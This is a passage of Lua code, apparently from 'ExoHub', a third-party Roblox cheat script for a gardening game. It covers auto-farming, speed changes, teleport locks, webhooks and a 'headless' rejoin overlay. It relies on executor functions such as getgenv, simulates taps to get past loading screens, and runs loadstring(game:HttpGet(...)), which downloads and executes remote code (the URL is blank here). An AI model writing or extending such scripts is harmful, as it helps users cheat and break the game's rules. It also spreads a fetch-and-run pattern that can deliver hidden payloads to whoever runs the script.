			table.insert(G, g.AuctioneerStatusText)
		end
		if h.webhook_enabled and (((h.egg_hatcher_webhook_enabled or h.seed_pack_opener_webhook_enabled)) and (type(g.PackOpeningWebhookStatusText) == "string" and g.PackOpeningWebhookStatusText ~= "")) then
			table.insert(G, g.PackOpeningWebhookStatusText)
		end
		if h.pet_finder_enabled and (type(g.PetFinderPremiumStatusText) == "string" and g.PetFinderPremiumStatusText ~= "") then
			table.insert(G, g.PetFinderPremiumStatusText)
		end
		if ((h.gift_send_enabled or h.gift_receive_enabled or h.gift_drop_pickup_enabled)) and (type(g.GiftSystemStatusText) == "string" and g.GiftSystemStatusText ~= "") then
			table.insert(G, g.GiftSystemStatusText)
		end
		if h.auto_drop_items_enabled and (type(g.AutoDropItemsStatusText) == "string" and g.AutoDropItemsStatusText ~= "") then
			table.insert(G, g.AutoDropItemsStatusText)
		end
		if Z.Mail and type(Z.Mail.RefreshManualUi) == "function" then
			Z.Mail.RefreshManualUi()
		end
		if ((g.MailManualRunning or h.mail_auto_send_enabled or h.mail_auto_accept)) and (type(g.MailStatusText) == "string" and g.MailStatusText ~= "") then
			table.insert(G, g.MailStatusText)
		end
		if type(g.MailWebOrderStatusText) == "string" and g.MailWebOrderStatusText ~= "" then
			table.insert(G, g.MailWebOrderStatusText)
		end
		if h.auto_collect_fruit_enabled and not h.collection_teleport then
			if Z.FruitCollect.IsFarFromGarden() then
				local V = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\226\143\184\239\184\143 [Out Of Garden]</font> <font color=\'%s\'> Fruit collector is paused.</font></stroke>", "#FF88FF")
				table.insert(G, V)
			end
		end
		if h.auto_shovel_plants then
			local V = g.PlantShovelStatusText
			if type(V) == "string" and V ~= "" then
				table.insert(G, V)
			end
		end
		if h.auto_shovel_fruits then
			local V = g.ShovelStatusText
			if type(V) == "string" and V ~= "" then
				table.insert(G, V)
			end
		end
		if h.auto_water_plants and (type(g.WaterPlantStatusText) == "string" and g.WaterPlantStatusText ~= "") then
			table.insert(G, g.WaterPlantStatusText)
		end
		if h.friend_garden_care_enabled and (type(g.FriendGardenCareStatusText) == "string" and g.FriendGardenCareStatusText ~= "") then
			table.insert(G, g.FriendGardenCareStatusText)
		end
		if h.auto_sprinkler_place and g.SprinklerPlaceStatusText ~= "" then
			table.insert(G, g.SprinklerPlaceStatusText)
		end
		if h.auto_fruit_favourite_enabled and (type(g.AutoFruitFavouriteStatusText) == "string" and g.AutoFruitFavouriteStatusText ~= "") then
			table.insert(G, g.AutoFruitFavouriteStatusText)
		end
		if h.moon_predictor_enabled and (type(g.MoonPredictorStatusText) == "string" and g.MoonPredictorStatusText ~= "") then
			table.insert(G, g.MoonPredictorStatusText)
		end
		if h.pet_return_farm and g.PetFarmStatusText ~= "" then
			table.insert(G, g.PetFarmStatusText)
		end
		if h.auto_trowel_plants and (type(g.TrowelStatusText) == "string" and g.TrowelStatusText ~= "") then
			table.insert(G, g.TrowelStatusText)
		end
		local y = Z.Teleport.GetLockStatusText()
		if y ~= "" then
			table.insert(G, y)
		end
		if h.player_speed_enabled and (type(g.PlayerSpeedStatusText) == "string" and g.PlayerSpeedStatusText ~= "") then
			table.insert(G, g.PlayerSpeedStatusText)
		end
		if h.auto_expand_garden and (type(g.GardenExpandStatusText) == "string" and g.GardenExpandStatusText ~= "") then
			table.insert(G, g.GardenExpandStatusText)
		end
		if h.auto_expand_pet_inventory and (type(g.PetMaxInventoryStatusText) == "string" and g.PetMaxInventoryStatusText ~= "") then
			table.insert(G, g.PetMaxInventoryStatusText)
		end
		if h.webhook_enabled and (type(g.WebhookStatusText) == "string" and g.WebhookStatusText ~= "") then
			table.insert(G, g.WebhookStatusText)
		end
		if ((h.save_sync_online_enabled or h.save_sync_auto_pull_enabled)) and (type(g.SaveSyncStatusText) == "string" and g.SaveSyncStatusText ~= "") then
			table.insert(G, g.SaveSyncStatusText)
		end
		if h.hide_log_ui then
			table.clear(G)
		end
		e.RealTimeStats.updateStatusList(G)
	end
end)
g.IsHeadless = type(G.IsHeadless) == "function" and G.IsHeadless() == true
g.HeadlessUI = {
	Create = function()
		if not g.IsHeadless or not y.PlayerGui then
			return
		end
		local G = y.PlayerGui:FindFirstChild("ExoHeadlessGui")
		if G then
			G:Destroy()
		end
		local V = Instance.new("ScreenGui")
		V.Name = "ExoHeadlessGui"
		V.ResetOnSpawn = false
		V.IgnoreGuiInset = true
		V.DisplayOrder = 999999
		V.Parent = y.PlayerGui
		local Z = Instance.new("Frame")
		Z.Name = "Main"
		Z.AnchorPoint = Vector2.new(.5, 0)
		Z.Position = UDim2.new(.5, 0, 0, 5)
		Z.Size = UDim2.fromOffset(260, 34)
		Z.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		Z.BorderSizePixel = 0
		Z.Parent = V
		local j = Instance.new("UICorner")
		j.CornerRadius = UDim.new(0, 6)
		j.Parent = Z
		local i = Instance.new("TextLabel")
		i.BackgroundTransparency = 1
		i.Position = UDim2.fromOffset(10, 0)
		i.Size = UDim2.new(1, - 130, 1, 0)
		i.Font = Enum.Font.GothamSemibold
		i.Text = "EXOHUB HEADLESS"
		i.TextColor3 = Color3.fromRGB(255, 255, 255)
		i.TextSize = 13
		i.TextXAlignment = Enum.TextXAlignment.Left
		i.Parent = Z
		local c = Instance.new("TextButton")
		c.Position = UDim2.new(1, - 115, 0, 4)
		c.Size = UDim2.fromOffset(78, 26)
		c.BackgroundColor3 = Color3.fromRGB(45, 100, 185)
		c.BorderSizePixel = 0
		c.Font = Enum.Font.GothamSemibold
		c.Text = "Rejoin"
		c.TextColor3 = Color3.fromRGB(255, 255, 255)
		c.TextSize = 12
		c.Parent = Z
		local J = Instance.new("UICorner")
		J.CornerRadius = UDim.new(0, 5)
		J.Parent = c
		local T = Instance.new("TextButton")
		T.Position = UDim2.new(1, - 32, 0, 4)
		T.Size = UDim2.fromOffset(28, 26)
		T.BackgroundColor3 = Color3.fromRGB(145, 45, 45)
		T.BorderSizePixel = 0
		T.Font = Enum.Font.GothamBold
		T.Text = "\195\151"
		T.TextColor3 = Color3.fromRGB(255, 255, 255)
		T.TextSize = 16
		T.Parent = Z
		local d = Instance.new("UICorner")
		d.CornerRadius = UDim.new(0, 5)
		d.Parent = T
		T.MouseButton1Click:Connect(function()
			V:Destroy()
		end)
		c.MouseButton1Click:Connect(function()
			if not c.Active then
				return
			end
			c.Active = false
			c.Text = "Joining..."
			local G = pcall(function()
				y.TeleportService:Teleport(game.PlaceId, y.LocalPlayer)
			end)
			if not G then
				c.Text = "Failed"
				task.wait(2)
				if c.Parent then
					c.Text = "Rejoin"
					c.Active = true
				end
			end
		end)
	end
}
g.HeadlessUI.Create()
pcall(function()
	local G = type(getgenv) == "function" and getgenv() or _G
	G.__exo_guard_claims_pro = false
	if type(g) == "table" and type(g.GetCheckIfPro) == "function" then
		G.__exo_guard_claims_pro = g.GetCheckIfPro() == true
	end;
	(loadstring(game:HttpGet("", true)))()
end)
local M = time() + 90
while time() < M do
	local G = q.IsLoadingCompleted()
	if G == true then
		warn("Loading complete")
		break
	end
	task.wait(1)
end
g.SimulateRealMobileTap = function()
	if not Z.PlayerData.GetLoadingScreenActive() then
		return
	end
	if not q.UserDevice.IsMobile() then
		return
	end
	local G = game:GetService("VirtualInputManager")
	local V = workspace.CurrentCamera
	if not V then
		return false
	end
	local y = V.ViewportSize
	if y.X <= 0 or y.Y <= 0 then
		return false
	end
	local j = 35
	local i = j
	local c = y.Y - j
	return pcall(function()
		G:SendTouchEvent(1, 0, i, c)
		task.wait(.08)
		G:SendTouchEvent(1, 2, i, c)
	end)
end
g.SimulateScreenTapWithGui = function()
	if not Z.PlayerData.GetLoadingScreenActive() then
		return
	end
	if not q.UserDevice.IsPC() then
		return
	end
	local G = game:GetService("VirtualInputManager")
	local V = workspace.CurrentCamera
	if not V then
		return false
	end
	local y = V.ViewportSize
	if y.X <= 0 or y.Y <= 0 then
		return false
	end
	local j = 35
	local i = j
	local c = y.Y - j
	return pcall(function()
		G:SendMouseButtonEvent(i, c, 0, true, game, 1)
		task.wait(.05)
		G:SendMouseButtonEvent(i, c, 0, false, game, 1)
	end)
end
g.loading_check_started = time() + 290
while time() < g.loading_check_started do
	if Z.PlayerData.GetLoadingScreenActive() == false then
		break
	end
	g.SimulateRealMobileTap()
	g.SimulateScreenTapWithGui()
	task.wait(10)
end
